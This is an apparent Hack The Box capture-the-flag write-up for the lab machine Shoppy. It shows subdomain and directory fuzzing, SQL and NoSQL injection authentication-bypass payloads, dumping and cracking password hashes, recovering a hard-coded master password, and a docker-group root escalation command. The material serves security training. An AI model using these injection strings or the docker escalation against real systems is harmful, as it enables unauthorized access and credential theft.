---
layout: single
classes: wide
title:  "HTB: Shoppy Writeup"
date:   2023-01-26 20:26:59 -0500
categories: ctf htb
---

Shoppy was an Easy rated box with fairly tricky initial foothold that touches on several different areas. I start by finding an admin page in a web application and using NoSQL injection for an authentication bypass. Once inside, I exploit another NoSQL injection to get a username and password hash, which is cracked and used to log into Mattermost. The Mattermost channels contain some user SSH credentials and other useful info. I log in via SSH and find a custom built password manager application which requires a static password, which can be acquired through a small amount of reverse engineering. The password manager gets me another user, who is in the docker group and can be escalated to root by mounting the filesystem into a new docker container.

![](/img/shoppy_writeup/ShoppyRes.png)

## Initial Enumeration

Nmap finds 3 open ports, 22(SSH), 80(HTTP), and 9093(?).

```
┌──(nskl㉿kali)-[~/HTB/Shoppy]
└─$ nmap -p- 10.10.11.180 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-27 21:41 EST
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up (0.033s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat

Nmap done: 1 IP address (1 host up) scanned in 11.69 seconds

┌──(nskl㉿kali)-[~/HTB/Shoppy]
└─$ nmap -sC -sV 10.10.11.180 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-27 21:41 EST
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title:             Shoppy Wait Page        
|_http-server-header: nginx/1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds
```

There is a web server on port 80 that redirects to shoppy.htb. I add it to my `/etc/hosts`.

![](/img/shoppy_writeup/Pasted image 20230122204148.png)

```
┌──(nskl㉿kali)-[~/HTB/Shoppy]
└─$ cat /etc/hosts    
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.180    shoppy.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

### Fuzzing Subdomains

Since we have a domain, we should check for subdomains. This generally yields results on HTB. I try to bruteforce, but everything in the initial attempt comes back with a 301 Response with a size of 169.

```
┌──(nskl㉿kali)-[~/HTB/Shoppy]
└─$ ffuf -u http://shoppy.htb -H 'Host:FUZZ.shoppy.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.shoppy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

webmail                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 28ms]
cpanel                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 28ms]
pop                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 28ms]
ns4                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 28ms]
localhost               [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 30ms]
smtp                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 30ms]
[...]
```

I filter responses of size 169 and try a few more wordlists, eventually finding a `mattermost` subdomain. Add this to `/etc/hosts`.

```
┌──(nskl㉿kali)-[~/HTB/Shoppy]
└─$ ffuf -u http://shoppy.htb -H 'Host:FUZZ.shoppy.htb' -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 169

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.shoppy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 169
________________________________________________

mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 39ms]
:: Progress: [100000/100000] :: Job [1/1] :: 1307 req/sec :: Duration: [0:01:15] :: Errors: 0 ::
```

```
┌──(nskl㉿kali)-[~/HTB/Shoppy]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.180    shoppy.htb mattermost.shoppy.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

http://mattermost.shoppy.htb redirects to a login page at /login:

![](/img/shoppy_writeup/Pasted image 20230122205852.png)

### 80 - Shoppy Webpage

The main page shows a large timer.

![](/img/shoppy_writeup/Pasted image 20230122204343.png)

The page is interactive and moves around. I couldn't find much identifying information about the tech stack.

If we try navigating to a non-existent page, it might return a 404 message with some useful identifying information. 

![](/img/shoppy_writeup/Pasted image 20230123195508.png)

Trying this, it returns a "Cannot GET /" message for the page we tried. Googling the phrase "Cannot GET /" returns results involving Node.JS, implying this is running Node.JS. I haven't found any identifying info to confirm it thus far. I proceed thinking this is most likely running Node.JS.

![](/img/shoppy_writeup/Pasted image 20230123195654.png)

I ran a directory bruteforce and found some new pages.

```
┌──(nskl㉿kali)-[~/HTB/Shoppy]
└─$ ffuf -u http://shoppy.htb/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -ic    

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 64ms]
                        [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 80ms]
**login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 80ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 76ms]**
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 46ms]
css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 32ms]
Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 61ms]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 43ms]
fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 25ms]
Admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 37ms]
exports                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 38ms]
                        [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 67ms]
LogIn                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 37ms]
LOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 48ms]
:: Progress: [220547/220547] :: Job [1/1] :: 925 req/sec :: Duration: [0:04:15] :: Errors: 0 ::
```

There's a login page at /login. Trying /admin just redirects to /login.

![](/img/shoppy_writeup/Pasted image 20230122210021.png)

### Port 9093

There was another open port at 9093. Opening it in a browser outputs some sort of log. There are repeated references to ``playbooks_plugin_system_``. Googling that phrase gives back some results relating to Mattermost, so maybe these logs are Mattermost-related. 
At the bottom there appears to be a version number, but I'm not sure if it's important at this stage.

`playbooks_plugin_system_playbook_instance_info{Version="1.29.1"}`

![](/img/shoppy_writeup/Pasted image 20230122210952.png)

I file this away for later, and start taking a look at the webpages more carefully in Burp.

## Initial Foothold (jaeger)

For the Shoppy login, any username/password combination just results in the same "Wrong Credentials" message.

![](/img/shoppy_writeup/Pasted image 20230123194733.png)

Since Shoppy appears to be a custom web application, I attempt SQL injection in the login fields, hoping for an authentication bypass.

Inserting a single quote character at the end of the username or password field results in the web server timing out, so this might lead to something useful. 

`username=admin'&password=admin`

![](/img/shoppy_writeup/Pasted image 20230123195224.png)

I try some more SQLi authentication bypass methods in the password field.

```
' OR 1=1-- -
' OR 1==1-- -
' OR 1=1 LIMIT 1;#
```

More SQLi authentication bypass methods can be found in the PayloadsAllTheThings repo [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection).

My attempts just resulted in these 302 redirects.

![](/img/shoppy_writeup/Pasted image 20230123200154.png)

Since the application looks like Node, it could be running mongodb and therefore need NoSQL injection instead of the standard SQL Injection I've been trying.

There is another PayloadsAllTheThings repo with NoSQL injection strings that I try [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection).

`username[$ne]=admin&password[$ne]=admin` results in another timeout.

I also tried sending the request as JSON, since I'm going off the assumption this is Node.JS and from my understanding this is how authentication is typically done there. That returns an error message.

![](/img/shoppy_writeup/Pasted image 20230123204353.png)

The error reveals the path of the web application and a username, `jaeger`.

![](/img/shoppy_writeup/Pasted image 20230123204459.png)

I was stuck at this point for a while, attempting different injection strings. Looking back at feedback for this machine, this seemed to be a common bottleneck for a lot of people.

Eventually, after a Google search of "nosql injection strings mongodb", I found this [blog post from Nullsweep](https://nullsweep.com/a-nosql-injection-primer-with-mongo/).

It specifically talks about MongoDB being able to evaluate Javascript if you can manage to inject it into a $where clause. It provides a code sample with a vulnerable user lookup, along with a payload string, `' || 'a'=='a`. In this case, the resulting expression would always return True, and therfore it would return all users. The same concept of injecting an always-true expression applies to these authentication bypasses I've been trying.

![](/img/shoppy_writeup/Pasted image 20230124205529.png)

I try this on Shoppy, using  `admin' || 'a'=='a`  in the username field with a junk password, and it takes us to a new page!

!![](/img/shoppy_writeup/Pasted image 20230124210050.png)

![](/img/shoppy_writeup/Pasted image 20230124210529.png)

The "Search for users" button lets us input a string and returns information about a user formatted as JSON if it exists. I try it with `admin` and receive a password hash.

![](/img/shoppy_writeup/Pasted image 20230124210742.png)

This field also turns out to be injectable in the same way. I try inputting `' || 'a'=='a` and it returns an extra user, `josh`, with password hash `6ebcea65320589ca4f2f1ce039975995`.

![](/img/shoppy_writeup/Pasted image 20230124210904.png)

These hashes appear to be MD5. I put josh's into a file called `josh_hash` and attempt to crack it with John, and it comes back with a password: `remembermethisway`

![](/img/shoppy_writeup/Pasted image 20230124211531.png)

I tried this password with `jaeger` and `josh` via our available authentication methods (SSH, Shoppy, and Mattermost).
It ended up working for `josh` on Mattermost.

![](/img/shoppy_writeup/Pasted image 20230125202304.png)

There are a few channels here. One is a private chat that gives us some credentials.

![](/img/shoppy_writeup/Pasted image 20230125202412.png)

Another mentions the existence of an in-house password manager being developed in C++, and one more mention of docker.

![](/img/shoppy_writeup/Pasted image 20230125202528.png)

We can log in via SSH with the credentials `jaeger`:`Sh0ppyBest@pp!`

## Escalation (jaeger -> deploy)

`jaeger` can run a binary as `deploy`. This looks like the password manager.

![](/img/shoppy_writeup/Pasted image 20230125203209.png)

```
jaeger@shoppy:/home/deploy$ ls -l
total 28
-rw------- 1 deploy deploy    56 Jul 22  2022 creds.txt
-rwxr--r-- 1 deploy deploy 18440 Jul 22  2022 password-manager
-rw------- 1 deploy deploy   739 Feb  1  2022 password-manager.cpp
jaeger@shoppy:/home/deploy$ cat password-manager.cpp 
cat: password-manager.cpp: Permission denied
jaeger@shoppy:/home/deploy$ file password-manager
password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped
```

We can't read the source code or `creds.txt`, but we can read the binary. I copy it back to my machine via SCP.

```
┌──(nskl㉿kali)-[~/HTB/Shoppy]
└─$ scp jaeger@shoppy.htb:/home/deploy/password-manager . 
jaeger@shoppy.htb's password: 
password-manager                                                                 100%   18KB 223.1KB/s   00:00
```

It's a 64-bit dynamically linked ELF. It's not stripped, which is good for us if we want to look at it in a debugger. It will likely spit out the contents of creds.txt if we give it the right master password.

![](/img/shoppy_writeup/Pasted image 20230125210619.png)

I look it over a bit with `strings`,`ltrace`, `xxd`, and `strace`, but can't find anything that looks useful.

Eventually I open it up in Ghidra, run the default analyzers and look at the main function that Ghidra decompiled. I'm pretty new to Ghidra at this point and there might be a way to clean up the result, but this is what I got.

It prints the welcome messages and asks for our input here:

![](/img/shoppy_writeup/Pasted image 20230125210958.png)

Then it creates a new string character by character, appending "Sample". It compares it to our input and stores it in a variable.

![](/img/shoppy_writeup/Pasted image 20230125211137.png)

If they don't match, it prints the rejection message. If they do, it opens `/home/deploy/creds.txt`.

![](/img/shoppy_writeup/Pasted image 20230125211305.png)

The master password "Sample" gets outputs the creds if we enter it into the live password-manager application.

```
jaeger@shoppy:/home/deploy$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

I took another look at the binary in `xxd` and found that "Sample" was visible in there after all. The creator likely built it character by character to prevent it from being picked up by `strings`, which appears to have worked.

![](/img/shoppy_writeup/Pasted image 20230126201702.png)

The credentials are `deploy`:`Deploying@pp!`. These appear to be for the `deploy` user, which we can SSH in as.

```
┌──(nskl㉿kali)-[~/HTB/Shoppy]
└─$ ssh deploy@shoppy.htb
deploy@shoppy.htb's password: Deploying@pp!
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ whoami
deploy
```

## Escalation (deploy -> root)

This user's default shell appears to be `/bin/sh` instead of `/bin/bash`, so I switch.

While I'm here, I peek at the password manager source code to confirm it's what I thought:

```
deploy@shoppy:~$ cat password-manager.cpp 
#include <iostream>
#include <string>

int main() {
    std::cout << "Welcome to Josh password manager!" << std::endl;
    std::cout << "Please enter your master password: ";
    std::string password;
    std::cin >> password;
    std::string master_password = "";
    master_password += "S";
    master_password += "a";
    master_password += "m";
    master_password += "p";
    master_password += "l";
    master_password += "e";
    if (password.compare(master_password) == 0) {
        std::cout << "Access granted! Here is creds !" << std::endl;
        system("cat /home/deploy/creds.txt");
        return 0;
    } else {
        std::cout << "Access denied! This incident will be reported !" << std::endl;
        return 1;
    }
}
```

After some initial enumeration, I find that `deploy` is in the docker group. This should be enough to get root.

```
deploy@shoppy:~$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

There aren't any containers running, and there is one image on the box, alpine.

```
deploy@shoppy:~$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
deploy@shoppy:~$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   6 months ago   5.53MB
```

By default, any docker container is run with root privileges. Since `deploy` is in the docker group, we can create a new container and have root privileges in it.
The idea behind this exploit is to mount the whole filesystem in a docker container, and since we'll have root access inside of it, we can read the root flag.

Here is some further information about this method:
<https://flast101.github.io/docker-privesc/>

I use the command from the [docker page on GTFObins]((https://gtfobins.github.io/gtfobins/docker/)). I get root access in the container and can read the flag. 

```
deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# cat /root/root.txt
f8c9e0*******************
```


